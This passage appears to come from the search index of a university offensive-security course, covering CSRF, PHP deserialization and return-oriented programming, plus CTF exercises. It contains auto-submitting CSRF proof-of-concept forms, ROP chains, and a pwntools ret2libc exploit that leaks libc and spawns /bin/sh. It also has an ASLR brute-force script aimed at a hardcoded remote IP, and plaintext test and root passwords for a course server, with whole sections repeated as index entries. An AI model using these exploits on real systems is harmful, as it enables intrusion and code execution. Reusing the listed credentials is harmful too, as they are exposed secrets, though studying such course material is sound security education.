sites. Cross-origin resource sharing : Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the CORS policy of the victim site . Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response. Ask for the password user to authorise the action. Resolve a captcha Read the Referrer or Origin headers. If a regex is used it could be bypassed form example with: http://mal.net?orig=http://example.com (ends with the url) http://example.com.mal.net (starts with the url) Modify the name of the parameters of the Post or Get request Use a CSRF token in each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS.","title":"Common defenses"},{"location":"CS315/Week%2012/#csrf-map","text":"","title":"CSRF map"},{"location":"CS315/Week%2012/#exploit-examples","text":"","title":"Exploit Examples"},{"location":"CS315/Week%2012/#exfiltrating-csrf-token","text":"If a CSRF token is being used as defence you could try to exfiltrate it abusing a XSS vulnerability or a Dangling Markup vulnerability.","title":"Exfiltrating CSRF Token"},{"location":"CS315/Week%2012/#get-using-html-tags","text":"<img src=\"http://google.es?param=VALUE\" style=\"display:none\" /> <h1>404 - Page not found</h1> The URL you are requesting is no longer available Other HTML5 tags that can be used to automatically send a GET request are:","title":"GET using HTML tags"},{"location":"CS315/Week%2012/#form-get-request","text":"<html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <script>history.pushState('', '', '/')</script> <form method=\"GET\" action=\"https://victim.net/email/change-email\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> document.forms[0].submit(); </script> </body> </html>","title":"Form GET request"},{"location":"CS315/Week%2012/#form-post-request","text":"<html> <body> <script>history.pushState('', '', '/')</script> <form action=\"https://victim.net/email/change-email\" id=\"csrfform\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /> <!-- Way 1 to autosubmit --> <input type=\"submit\" value=\"Submit request\" /> <img src=x onerror=\"csrfform.submit();\" /> <!-- Way 2 to autosubmit --> </form> <script> document.forms[0].submit(); //Way 3 to autosubmit </script> </body> </html>","title":"Form POST request"},{"location":"CS315/Week%2012/#form-post-request-through-iframe","text":"<!-- The request is sent through the iframe withuot reloading the page --> <html> <body> <iframe style=\"display:none\" name=\"csrfframe\"></iframe> <form action=\"/change-email\" id=\"csrfform\" target=\"csrfframe\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> document.forms[0].submit(); </script> </body> </html>","title":"Form POST request through iframe"},{"location":"CS315/Week%2012/#tools","text":"https://github.com/0xInfection/XSRFProbe","title":"Tools"},{"location":"CS315/Week%2012/#http-headers","text":"Depending on the HTTP headers given by the web server some vulnerabilities might be present. Clickjacking Content Security Policy bypass Cookies Hacking CORS - Misconfigurations & Bypass","title":"HTTP Headers"},{"location":"CS315/Week%2012/#bypasses","text":"There are several specific functionalities were some workarounds might be useful to bypass them 2FA/OPT Bypass Bypass Payment Process Captcha Bypass Login Bypass Race Condition Rate Limit Bypass Reset Forgotten Password Bypass Registration Vulnerabilities","title":"Bypasses"},{"location":"CS315/Week%2012/#structured-objects-specific-functionalities","text":"Some functionalities will require the data to be structured on a very specific format (like a language serialized object or a XML). Therefore, it's more easy to identify is the application might be vulnerable as it needs to be processing that kind of data. Some specific functionalities my be also vulnerable if a specific format of the input is used (like Email Header Injections). Deserialization Email Header Injection JWT Vulnerabilities XML External Entity","title":"Structured objects / Specific functionalities"},{"location":"CS315/Week%2012/#deserialization","text":"Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML. In many occasions you can find some code in the server side that unserialize some object given by the user. In this case, you can send a malicious payload to make the server side behave unexpectedly. You should read: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html for learn how to attack.","title":"Deserialization"},{"location":"CS315/Week%2012/#php","text":"Magic method used with serialization: __sleep is called when an object is serialized and must be returned to array Magic method used with deserialization __wakeup is called when an object is deserialized. __destruct is called when PHP script end and object is destroyed. __toString uses object as string but also can be used to read file or more than that based on function call inside it. <?php class test { public $s = \"This is a test\"; public function displaystring(){ echo $this->s.'<br />'; } public function __toString() { echo '__toString method called'; } public function __construct(){ echo \"__construct method called\"; } public function __destruct(){ echo \"__destruct method called\"; } public function __wakeup(){ echo \"__wakeup method called\"; } public function __sleep(){ echo \"__sleep method called\"; return array(\"s\"); #The \"s\" makes references to the public attribute } } $o = new test(); $o->displaystring(); $ser=serialize($o); echo $ser; $unser=unserialize($ser); $unser->displaystring(); /* php > $o = new test(); __construct method called__destruct method called php > $o->displaystring(); This is a test<br /> php > $ser=serialize($o); __sleep method called php > echo $ser; O:4:\"test\":1:{s:1:\"s\";s:14:\"This is a test\";} php > $unser=unserialize($ser); __wakeup method called__destruct method called php > $unser->displaystring(); This is a test<br /> */ ?> If you look to the results you can see that the functions __wakeup and __destruct are called when the object is deserialized. Note that in several tutorials you will find that the __toString function is called when trying yo print some attribute, but apparently that's not happening anymore . Autoload Classes may also be dangerous . You can read an explained PHP example here : https://www.notsosecure.com/remote-code-execution-via-php-unserialize/, here https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf or here https://securitycafe.ro/2015/01/05/understanding-php-object-injection/","title":"PHP"},{"location":"CS315/Week%2012/#serializing-referenced-values","text":"If for some reason you want to serialize a value as a reference to another value serialized you can: <?php class AClass { public $param1; public $param2; } $o = new WeirdGreeting; $o->param1 =& $o->param22; $o->param = \"PARAM\"; $ser=serialize($o);","title":"Serializing Referenced Values"},{"location":"CS315/Week%2012/#files","text":"Functionalities that allow to upload files might be vulnerable to several issues. Functionalities that generates files including user input might execute unexpected code. Users that open files uploaded by users or automatically generated including user input might be compromised. File Upload Formula Injection PDF Injection Server Side XSS","title":"Files"},{"location":"CS315/Week%2012/#external-identity-management","text":"OAUTH to Account takeover SAML Attacks","title":"External Identity Management"},{"location":"CS315/Week%2012/#other-helpful-vulnerabilities","text":"This vulnerabilities might help to exploit other vulnerabilities. Domain/Subdomain takeover IDOR Parameter Pollution Unicode Normalization vulnerability","title":"Other Helpful Vulnerabilities"},{"location":"CS315/Week%2012/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%2012/#10-pt-blogger-website","text":"In this challenge, you need to download the following virtual machine to finish the challenges. The box was created with Virtualbox . Upon booting up use netdiscover tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case. You don't need to answer all questions in order. Skip some questions may not affect the next steps. Download: https://mega.nz/file/HxFXgIAT#PFjk8HV_ltXVh-Hz1D3xAXYc31GpmgTQeFfkKibn9Tc Mirror: https://pan.baidu.com/s/1mOZxE_XHgbSZR_yKTWQAbA (Code: 1337)","title":"(10 pt) Blogger Website"},{"location":"CS315/Week%2012/#2-pt-establish","text":"Environment setup should use VirtualBox history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup Network as the following: While the Serial Ports setting as follow (Port Mode set to Disconnected ): The virtual image should enter the following promption: Ubuntu 16.04.7 LTS ubuntu-xenial tty1 ubuntu-xenial login: _ Finding the IP address: Open you terminal (powershell.exe in Windows), and use ipconfig /all to find your Host-only NET ip address. Use any tool to scan the ip 192.168.xx.0/24 and you can find the virtual machine ip address. Otherwise, you can also use arp -a to find your Host-only Network address, and usually VM's ip address is followed. Open your web browser, you can find this page in VM's ip address: You are done with configuration, now you can hack the machine and solve the challenges! Upload a screenshot about the web page and the IP address would give 2 points.","title":"(2 pt) Establish"},{"location":"CS315/Week%2012/#2-pt-port-scan-and-directory-scan","text":"Using Nmap you can scan open ports of VM. Only port 80 is open and we can find a HTTP website. Using Gobuster or Dirb to scan the website directory, you may find a upload folder under the blogger. What's the URL of the upload folder? Answer: http://ip/******/*****/****/**********/*******/ (replace all stars to your answer) Hint: kali wordlists for scanning: /usr/share/wordlists. If you don't have those files, it's fine to search a wordlist online.","title":"(2 pt) Port scan and directory scan"},{"location":"CS315/Week%2012/#2-pt-wordpress","text":"It's easy to find the blogger is using Wordpress. The version of the given blogger is vulnerable. What's the vulnerability name of the blogger? Answer: A******** F*** U***** (replace all stars to your answer, needn't to be 100% the same) Hint: look at the version of wordpress. Search in the exploitDB.","title":"(2 pt) Wordpress"},{"location":"CS315/Week%2012/#2-pt-reverse-shell","text":"Using the vulnerability, you can get a reversed shell. Besides, with some techniques, you can generate a pty shell. What's the name of users? Answer: u*****, j****, v****** (replace all stars to your answer) Hint: users can be located in /etc/passwd or /home folder.","title":"(2 pt) Reverse shell"},{"location":"CS315/Week%2012/#2-pt-root","text":"Weak password is dangerous, using Hydra or other password cracker can easily break the weak password. Get the root privilege and find me root.txt . Answer: flag{****_****_***_**********_** **} Hint: sometimes sudo can be vulnerable.","title":"(2 pt) Root"},{"location":"CS315/Week%2013/","text":"Week13 PWN: ROL and ROP Return Oriented Programming Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things. As we saw in buffer overflows , having stack control can be very powerful since it allows us to overwrite saved instruction pointers, giving us control over what the program does next. Most programs don't have a convenient give_shell function however, so we need to find a way to manually invoke system or another exec function to get us our shell. 32 bit Imagine we have a program similar to the following: #include <stdio.h> #include <stdlib.h> char name[32]; int main() { printf(\"What's your name? \"); read(0, name, 32); printf(\"Hi %s\\n\", name); printf(\"The time is currently \"); system(\"/bin/date\"); char echo[100]; printf(\"What do you want me to echo back? \"); read(0, echo, 1000); puts(echo); return 0; } We obviously have a stack buffer overflow on the echo variable which can give us EIP control when main returns. But we don't have a give_shell function! So what can we do? We can call system with an argument we control! Since arguments are passed in on the stack in 32-bit Linux programs (see calling conventions ), if we have stack control, we have argument control. When main returns, we want our stack to look like something had normally called system . Recall what is on the stack after a function has been called: ... // More arguments 0xffff0008: 0x00000002 // Argument 2 0xffff0004: 0x00000001 // Argument 1 ESP -> 0xffff0000: 0x080484d0 // Return address So main 's stack frame needs to look like this: 0xffff0008: 0xdeadbeef // system argument 1 0xffff0004: 0xdeadbeef // return address for system ESP -> 0xffff0000: 0x08048450 // return address for main (system's PLT entry) Then when main returns, it will jump into system 's PLT entry and the stack will appear just like system had been called normally for the first time. Note: we don't care about the return address system will return to because we will have already gotten our shell by then! Arguments This is a good start, but we need to pass an argument to system for anything to happen. As mentioned in the page on ASLR , the stack and dynamic libraries \"move around\" each time a program is run, which means we can't easily use data on the stack or a string in libc for our argument. In this case however, we have a very convenient name global which will be at a known location in the binary (in the BSS segment). Putting it together Our exploit will need to do the following: Enter \"sh\" or another command to run as name Fill the stack with Garbage up to the saved EIP The address of system 's PLT entry A fake return address for system to jump to when it's done The address of the name global to act as the first argument to system 64 bit In 64-bit binaries we have to work a bit harder to pass arguments to functions. The basic idea of overwriting the saved RIP is the same, but as discussed in calling conventions , arguments are passed in registers in 64-bit programs. In the case of running system , this means we will need to find a way to control the RDI register. To do this, we'll use small snippets of assembly in the binary, called \"gadgets.\" These gadgets usually pop one or more registers off of the stack, and then call ret , which allows us to chain them together by making a large fake call stack. For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like rp++ or ROPgadget ): 0x400c01: pop rdi; ret 0x400c03: pop rsi; pop r15; ret We can setup a fake call stack with these gadets to sequentially execute them, pop ing values we control into registers, and then end with a jump to system . Example 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget 0xffff0008: 0xdeadbeef // value to be popped into rdi RSP -> 0xffff0000: 0x400c01 // address of rdi gadget Stepping through this one instruction at a time, main returns, jumping to our pop rdi gadget: RIP = 0x400c01 (pop rdi) RDI = UNKNOWN RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget RSP -> 0xffff0008: 0xdeadbeef // value to be popped into rdi pop rdi is then executed, popping the top of the stack into RDI: RIP = 0x400c02 (ret) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi RSP -> 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget The RDI gadget then ret s into our RSI gadget: RIP = 0x400c03 (pop rsi) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) RSP -> 0xffff0018: 0x1337beef // value we want in rsi RSI and R15 are popped: RIP = 0x400c05 (ret) RDI = 0xdeadbeef RSI = 0x1337beef RSP -> 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled And finally, the RSI gadget ret s, jumping to whatever function we want, but now with RDI and RSI set to values we control. ROP - Syscall execv The objective is to call the syscall (execv) from a ROP controlling the value of registries: RDI, RSI, RDX, RAX and obviously the RIP (the other ones doesn't matters), and controlling somewhere to write \"/bin/sh\" RDI: Pointing to the string \"/bin/bash\" RSI: Null RDX: Null RAX: Value 0x3b for x64 and 0xb for x32, because this will call execv ROPgadget --binary vulnbinary | grep syscall ROPgadget --binary vulnbinary | grep \"rdi\\|rsi\\|rdx\\|rax\" | grep pop Writing If you can somehow write to an address and then get the address of where you have written then this step is unnecessary. Elsewhere, you may search for some write-what-where. As is explained in this tutorial: https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ you have to find something that allows you to save some value inside a registry and then save it to some controlled address inside another registry. For example some pop eax; ret , pop edx: ret , mov eax, [edx] You can find mov gadgets doing: ROPgadget --binary vulnbinary | grep mov Finding a place to write If you have found some write-what-where and can control the needed registries to call execv, there is only left finding a place to write. objdump -x vulnbinary | grep \".bss\" -B1 CONTENTS, ALLOC, LOAD, DATA 23 .bss 00000010 00403418 00403418 00002418 23 In this case: 0x403418 Writing \"/bin/sh\" buffer += address(pop_eax) # place value into EAX buffer += \"/bin\" # 4 bytes at a time buffer += address(pop_edx) # place value into edx buffer += address(writable_memory) buffer += address(writewhatwhere) buffer += address(pop_eax) buffer += \"//sh\" buffer += address(pop_edx) buffer += address(writable_memory + 4) buffer += address(writewhatwhere) ROP - Leaking LIBC address Quick Resume Find overflow offset Find POP_RDI, PUTS_PLT and MAIN_PLT gadgets Find memory address of puts and guess the libc version (donwload it) Given the library just exploit it Other tutorials and binaries to practice This tutorial is going to exploit the code/binary proposed in this tutorial: https://tasteofsecurity.com/security/ret2libc-unknown-libc/ Another useful tutorial: https://made0x78.com/bseries-ret2libc/ Code Filename: vuln.c #include <stdio.h> int main() { char buffer[32]; puts(\"Simple ROP.\\n\"); gets(buffer); return 0; } gcc -o vuln vuln.c -fno-stack-protector -no-pie ROP - PWNtools template Find my ROP-PWNtools template here. I'm going to use the code located there to make the exploit. Download the exploit and place it in the same directory as the vulnerable binary. 1- Finding the offset The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default OFFSET = \"\" ): #################### #### Find offset ### #################### OFFSET = \"\"#\"A\"*72 if OFFSET == \"\": gdb.attach(p.pid, \"c\") #Attach and continue payload = cyclic(1000) print(r.clean()) r.sendline(payload) #x/wx $rsp -- Search for bytes that crashed the application #cyclic_find(0x6161616b) # Find the offset of those bytes return Execute python template.py a GDB console will be opened with the program being crashed. Inside that GDB console execute x/wx $rsp to get the bytes that were going to overwrite the RIP. Finally get the offset using a python console: from pwn import * cyclic_find(0x6161616b) After finding the offset (in this case 40) change the OFFSET variable inside the template using that value. OFFSET = \"A\" * 40 2- Finding Gadgets Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call puts to find the libc being used, and later to launch the final exploit. PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols[\"puts\"] # This is also valid to call puts MAIN_PLT = elf.symbols['main'] POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep \"pop rdi\" RET = (rop.find_gadget(['ret']))[0] log.info(\"Main start: \" + hex(MAIN_PLT)) log.info(\"Puts plt: \" + hex(PUTS_PLT)) log.info(\"pop rdi; ret gadget: \" + hex(POP_RDI)) The PUTS_PLT is needed to call the function puts. The MAIN_PLT is needed to call the main function again after one interaction to exploit the overflow again (infinite rounds of exploitation).It is used at the end of each ROP. The POP_RDI is needed to pass a parameter to the called function. In this step you don't need to execute anything as everything will be found by pwntools during the execution. 3- Finding LIBC library Now is time to find which version of the libc library is being used. To do so we are going to leak the address in memory of the function puts and then we are going to search in which library version the puts version is in that address. def get_addr(func_name): FUNC_GOT = elf.got[func_name] log.info(func_name + \" GOT @ \" + hex(FUNC_GOT)) # Create rop chain rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) #Send our rop-chain payload #p.sendlineafter(\"dah?\", rop1) #Interesting to send in a specific moment print(p.clean()) # clean socket buffer (read all and print) p.sendline(rop1) #Parse leaked address recieved = p.recvline().strip() leak = u64(recieved.ljust(8, \"\\x00\")) log.info(\"Leaked libc address, \"+func_name+\": \"+ hex(leak)) #If not libc yet, stop here if libc != \"\": libc.address = leak - libc.symbols[func_name] #Save libc base log.info(\"libc base @ %s\" % hex(libc.address)) return hex(leak) get_addr(\"puts\") #Search for puts address in memmory to obtains libc base if libc == \"\": print(\"Find the libc library and continue with the exploit... (https://libc.blukat.me/)\") p.interactive() To do so, the most important line of the executed code is: rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) This will send some bytes util overwriting the RIP is possible: OFFSET . Then, it will set the address of the gadget POP_RDI so the next address ( FUNC_GOT ) will be saved in the RDI registry. This is because we want to call puts passing it the address of the PUTS_GOT as the address in memory of puts function is saved in the address pointing by PUTS_GOT . After that, PUTS_PLT will be called (with PUTS_GOT inside the RDI) so puts will read the content inside PUTS_GOT (the address of puts function in memory) and will print it out. Finally, main function is called again so we can exploit the overflow again. This way we have tricked puts function to print out the address in memory of the function puts (which is inside libc library). Now that we have that address we can search which libc version is being used. As we are exploiting some local binary it is not needed to figure out which version of libc is being used (just find the library in /lib/x86_64-linux-gnu/libc.so.6 ). But, in a remote exploit case I will explain here how can you find it: 3.1- Searching for libc version (1) You can search which library is being used in the web page: https://libc.blukat.me/ It will also allow you to download the discovered version of libc 3.2- Searching for libc version (2) You can also do: $ git clone https://github.com/niklasb/libc-database.git $ cd libc-database $ ./get This will take some time, be patient. For this to work we need: Libc symbol name: puts Leaked libc adddress: 0x7ff629878690 We can figure out which libc that is most likely used. ./find puts 0x7ff629878690 ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) archive-glibc (id libc6_2.23-0ubuntu11_amd64) We get 2 matches (you should try the second one if the first one is not working). Download the first one: ./download libc6_2.23-0ubuntu10_amd64 Getting libc6_2.23-0ubuntu10_amd64 -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb -> Downloading package -> Extracting package -> Package saved to libs/libc6_2.23-0ubuntu10_amd64 Copy the libc from libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so to our working directory. 3.3- Other functions to leak puts printf __libc_start_main read gets 4- Finding based libc address & exploiting At this point we should know the libc library used. As we are exploiting a local binary I will use just: /lib/x86_64-linux-gnu/libc.so.6 So, at the begging of template.py change the libc variable to: libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #Set library path when know it Giving the path to the libc library the rest of the exploit is going to be automatically calculated. Inside the get_addr function the base address of libc is going to be calculated: if libc != \"\": libc.address = leak - libc.symbols[func_name] #Save libc base log.info(\"libc base @ %s\" % hex(libc.address)) Then, the address to the function system and the address to the string \"/bin/sh\" are going to be calculated from the base address of libc and given the libc library. BINSH = next(libc.search(\"/bin/sh\")) - 64 #Verify with find /bin/sh SYSTEM = libc.sym[\"system\"] EXIT = libc.sym[\"exit\"] log.info(\"bin/sh %s \" % hex(BINSH)) log.info(\"system %s \" % hex(SYSTEM)) Finally, the /bin/sh execution exploit is going to be prepared sent: rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT) p.clean() p.sendline(rop2) ##### Interact with the shell ##### p.interactive() #Interact with the conenction Let's explain this final ROP. The last ROP ( rop1 ) ended calling again the main function, then we can exploit again the overflow (that's why the OFFSET is here again). Then, we want to call POP_RDI pointing to the addres of \"/bin/sh\" ( BINSH ) and call system function ( SYSTEM ) because the address of \"/bin/sh\" will be passed as a parameter. Finally, the address of exit function is called so the process exists nicely and any alert is generated. This way the exploit will execute a /bin/sh shell. 4(2)- Using ONE_GADGET You could also use ONE_GADGET to obtain a shell instead of using system and \"/bin/sh\". ONE_GADGET will find inside the libc library some way to obtain a shell using just one ROP. However, normally there are some constrains, the most common ones and easy to avoid are like [rsp+0x30] == NULL As you control the values inside the RSP you just have to send some more NULL values so the constrain is avoided. ONE_GADGET = libc.address + 0x4526a rop2 = base + p64(ONE_GADGET) + \"\\x00\"*100 EXPLOIT FILE You can find a template to exploit this vulnerability here: ROP-PWN template Common problems MAIN_PLT = elf.symbols['main'] not found If the \"main\" symbol does not exist. Then you can just where is the main code: objdump -d vuln_binary | grep \"\\.text\" Disassembly of section .text: 0000000000401080 <.text>: and set the address manually: MAIN_PLT = 0x401080 Puts not found If the binary is not using Puts you should check if it is using sh: 1: %s%s%s%s%s%s%s%s: not found If you find this error after creating all the exploit: sh: 1: %s%s%s%s%s%s%s%s: not found Try to subtract 64 bytes to the address of \"/bin/sh\": BINSH = next(libc.search(\"/bin/sh\")) - 64 Ret2Lib If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow. If you are inside the host You can find the address of lib c ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time) If you want to check if the ASLR is changing the address of libc you can do: for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done Get offset of system function readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system Get offset of \"/bin/sh\" strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh /proc/\\ /maps If the process is creating children every time you talk with it (network server) try to read that file (probably you will need to be root). Here you can find exactly where is the libc loaded inside the process and where is going to be loaded for every children of the process. In this case it is loaded in 0xb75dc000 (This will be the base address of libc) Using gdb-peda Get address of system function, of exit function and of the string \"/bin/sh\" using gdb-peda: p system p exit find \"/bin/sh\" Bypassing ASLR You can try to bruteforce the abse address of libc. for off in range(0xb7000000, 0xb8000000, 0x1000): Code from pwn import * c = remote('192.168.85.181',20002) c.recvline() #Banner for off in range(0xb7000000, 0xb8000000, 0x1000): p = \"\" p += p32(off + 0x0003cb20) #system p += \"CCCC\" #GARBAGE p += p32(off + 0x001388da) #/bin/sh payload = 'A'*0x20010 + p c.send(payload) c.interactive() #? Exercise (5 pt) ret2win Challenge is from https://ropemporium.com/challenge/ret2win.html If you are interested in the ROP exploit, please take a look at ROP Emporium. Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack. nc 103.102.44.218 10001 Download binary x86_64 ELF: https://ropemporium.com/binary/ret2win.zip Hint: check the LET'S DO THIS part of original challenge. (5 pt) AWD prepare We know that we are going to have a AWD CTF next week. Make sure you have access to the test AWD environment. Check the demo challenge and try to hack it to get a flag. Browser the page http://103.102.44.218:23333/ in your browser, login with some test account below: Account\uff1aTEST1 Password\uff1aYpkyiQDwGHLjoOk3 Account\uff1aTEST2 Password\uff1apQXBpiFPlNBB6TUt Account\uff1aTEST3 Password\uff1acUMvgNGCb64E4uLv Account\uff1aTEST4 Password\uff1aRQGqtTfK6601c7qY Account\uff1aTEST5 Password\uff1aSVtm4Pd3vtAaeQvZ Account\uff1aTEST6 Password\uff1alNTrEnx586taV8Ow Account\uff1aTEST7 Password\uff1awXxFkOsGcpb1XsIo Account\uff1aTEST8 Password\uff1aAhcNEZpaBWAm3Jst Account\uff1aTEST9 Password\uff1alxqzbu9tjkshQ0oB Account\uff1aTEST10 Password\uff1abRewQknqeY3yrZCc The flag file is located in /var/flag/flag.txt . The application files are under /app . You have the permission to read and modify the application files. During the AWD CTF, you can only access ctf user. Here's the account information: IP address: 103.102.44.218 Service port: 20000-20009 SSH port: 30000-30009 Username: ctf Password: 123456 Further, only for testing, you have the root password: Username: root Password: rootpassword Please DO NOT change the password of the users during testing. In this challenge, you should post those screenshots in your writeup: The screenshot of the port 2000x: make sure the PHP code is shown. \u200b In the browser: http://103.102.44.218:2000x/ The screenshot of the successful login to port 3000x: make sure you can access the server from user ctf . \u200b In the terminal: ssh ctf@103.102.44.218 -p 3000x The screenshot of the flag.txt content. \u200b In the ssh session: cat /var/flag/flag.txt Hope you enjoy the AWD. Q&As: Q: How to modify the file on the server? A: Use scp command to transfer files through network. Download the file to you local machine and modify, after that then push the file to the server. For example: scp -P 30000 ctf@103.102.44.218:/app/index.php ./ <modify> scp -P 30000 ./index.php ctf@103.102.44.218:/app/index.php Q: Can I install software on the server (vim for example)? A: You can't install software through apt. But if you have other methods, they're allowed. Q: Can I delete flag.txt after I read it? A: You can't. Only root can modify flag.txt.","title":"Week13 PWN: ROL and ROP"},{"location":"CS315/Week%2013/#week13-pwn-rol-and-rop","text":"","title":"Week13 PWN: ROL and ROP"},{"location":"CS315/Week%2013/#return-oriented-programming","text":"Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things. As we saw in buffer overflows , having stack control can be very powerful since it allows us to overwrite saved instruction pointers, giving us control over what the program does next. Most programs don't have a convenient give_shell function however, so we need to find a way to manually invoke system or another exec function to get us our shell.","title":"Return Oriented Programming"},{"location":"CS315/Week%2013/#32-bit","text":"Imagine we have a program similar to the following: #include <stdio.h> #include <stdlib.h> char name[32]; int main() { printf(\"What's your name? \"); read(0, name, 32); printf(\"Hi %s\\n\", name); printf(\"The time is currently \"); system(\"/bin/date\"); char echo[100]; printf(\"What do you want me to echo back? \"); read(0, echo, 1000); puts(echo); return 0; } We obviously have a stack buffer overflow on the echo variable which can give us EIP control when main returns. But we don't have a give_shell function! So what can we do? We can call system with an argument we control! Since arguments are passed in on the stack in 32-bit Linux programs (see calling conventions ), if we have stack control, we have argument control. When main returns, we want our stack to look like something had normally called system . Recall what is on the stack after a function has been called: ... // More arguments 0xffff0008: 0x00000002 // Argument 2 0xffff0004: 0x00000001 // Argument 1 ESP -> 0xffff0000: 0x080484d0 // Return address So main 's stack frame needs to look like this: 0xffff0008: 0xdeadbeef // system argument 1 0xffff0004: 0xdeadbeef // return address for system ESP -> 0xffff0000: 0x08048450 // return address for main (system's PLT entry) Then when main returns, it will jump into system 's PLT entry and the stack will appear just like system had been called normally for the first time. Note: we don't care about the return address system will return to because we will have already gotten our shell by then!","title":"32 bit"},{"location":"CS315/Week%2013/#arguments","text":"This is a good start, but we need to pass an argument to system for anything to happen. As mentioned in the page on ASLR , the stack and dynamic libraries \"move around\" each time a program is run, which means we can't easily use data on the stack or a string in libc for our argument. In this case however, we have a very convenient name global which will be at a known location in the binary (in the BSS segment).","title":"Arguments"},{"location":"CS315/Week%2013/#putting-it-together","text":"Our exploit will need to do the following: Enter \"sh\" or another command to run as name Fill the stack with Garbage up to the saved EIP The address of system 's PLT entry A fake return address for system to jump to when it's done The address of the name global to act as the first argument to system","title":"Putting it together"},{"location":"CS315/Week%2013/#64-bit","text":"In 64-bit binaries we have to work a bit harder to pass arguments to functions. The basic idea of overwriting the saved RIP is the same, but as discussed in calling conventions , arguments are passed in registers in 64-bit programs. In the case of running system , this means we will need to find a way to control the RDI register. To do this, we'll use small snippets of assembly in the binary, called \"gadgets.\" These gadgets usually pop one or more registers off of the stack, and then call ret , which allows us to chain them together by making a large fake call stack. For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like rp++ or ROPgadget ): 0x400c01: pop rdi; ret 0x400c03: pop rsi; pop r15; ret We can setup a fake call stack with these gadets to sequentially execute them, pop ing values we control into registers, and then end with a jump to system .","title":"64 bit"},{"location":"CS315/Week%2013/#example","text":"0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget 0xffff0008: 0xdeadbeef // value to be popped into rdi RSP -> 0xffff0000: 0x400c01 // address of rdi gadget Stepping through this one instruction at a time, main returns, jumping to our pop rdi gadget: RIP = 0x400c01 (pop rdi) RDI = UNKNOWN RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget RSP -> 0xffff0008: 0xdeadbeef // value to be popped into rdi pop rdi is then executed, popping the top of the stack into RDI: RIP = 0x400c02 (ret) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi RSP -> 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget 